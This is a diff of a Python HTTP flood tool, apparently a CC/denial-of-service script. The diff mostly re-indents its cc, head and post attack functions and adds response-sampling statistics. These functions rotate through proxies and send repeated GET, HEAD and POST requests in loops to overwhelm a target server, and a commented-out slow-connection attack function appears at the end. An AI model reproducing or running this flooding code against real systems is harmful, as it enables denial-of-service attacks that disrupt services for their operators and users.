@@ -330,30 +330,30 @@ def cc(event,proxy_type):
 					request = get_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
-					    proxy = Choice(proxies).strip().split(":")
-					    update_stats_sample(is_error=True)
-					    break
+						proxy = Choice(proxies).strip().split(":")
+						update_stats_sample(is_error=True)
+						break
 					
 					# 只对采样的请求进行响应解析
 					if request_count % SAMPLE_RATE == 0:
-					    try:
-					        s.settimeout(1)  # 设置较短的超时时间
-					        response = s.recv(1024)
-					        status_code = parse_response(response)
-					        update_stats_sample(status_code=status_code)
-					    except:
-					        update_stats_sample(is_error=True)
+						try:
+							s.settimeout(1)  # 设置较短的超时时间
+							response = s.recv(1024)
+							status_code = parse_response(response)
+							update_stats_sample(status_code=status_code)
+						except:
+							update_stats_sample(is_error=True)
 					else:
-					    # 非采样请求只做简单计数
-					    update_stats_sample()
-				#s.setsockopt(socket.SO_LINGER,0)
+						# 非采样请求只做简单计数
+						update_stats_sample()
 				s.close()
 			except:
 				s.close()
 		except:
 			s.close()
 
-def head(event,proxy_type):#HEAD MODE
+
+def head(event,proxy_type):
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -381,28 +381,28 @@ def head(event,proxy_type):#HEAD MODE
 					request = head_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
-					    proxy = Choice(proxies).strip().split(":")
-					    update_stats_sample(is_error=True)
-					    break
+						proxy = Choice(proxies).strip().split(":")
+						update_stats_sample(is_error=True)
+						break
 					
 					# 只对采样的请求进行响应解析
 					if request_count % SAMPLE_RATE == 0:
-					    try:
-					        s.settimeout(1)
-					        response = s.recv(1024)
-					        status_code = parse_response(response)
-					        update_stats_sample(status_code=status_code)
-					    except:
-					        update_stats_sample(is_error=True)
+						try:
+							s.settimeout(1)
+							response = s.recv(1024)
+							status_code = parse_response(response)
+							update_stats_sample(status_code=status_code)
+						except:
+							update_stats_sample(is_error=True)
 					else:
-					    # 非采样请求只做简单计数
-					    update_stats_sample()
-
+						# 非采样请求只做简单计数
+						update_stats_sample()
 				s.close()
 			except:
 				s.close()
-		except:#dirty fix
+		except:
 			s.close()
+
 
 def post(event,proxy_type):
 	request = GenReqHeader("post")
@@ -427,27 +427,28 @@ def post(event,proxy_type):
 				for _ in range(100):
 					sent = s.send(str.encode(request))
 					if not sent:
-					    proxy = Choice(proxies).strip().split(":")
-					    update_stats_sample(is_error=True)
-					    break
+						proxy = Choice(proxies).strip().split(":")
+						update_stats_sample(is_error=True)
+						break
 					
 					# 只对采样的请求进行响应解析
 					if request_count % SAMPLE_RATE == 0:
-					    try:
-					        s.settimeout(1)
-					        response = s.recv(1024)
-					        status_code = parse_response(response)
-					        update_stats_sample(status_code=status_code)
-					    except:
-					        update_stats_sample(is_error=True)
+						try:
+							s.settimeout(1)
+							response = s.recv(1024)
+							status_code = parse_response(response)
+							update_stats_sample(status_code=status_code)
+						except:
+							update_stats_sample(is_error=True)
 					else:
-					    # 非采样请求只做简单计数
-					    update_stats_sample()
+						# 非采样请求只做简单计数
+						update_stats_sample()
 				s.close()
 			except:
 				s.close()
 		except:
 			s.close()
+
 ''' idk why it's not working, so i temporarily removed it
 def slow_atk_conn(proxy_type,rlock):
 	global socket_list
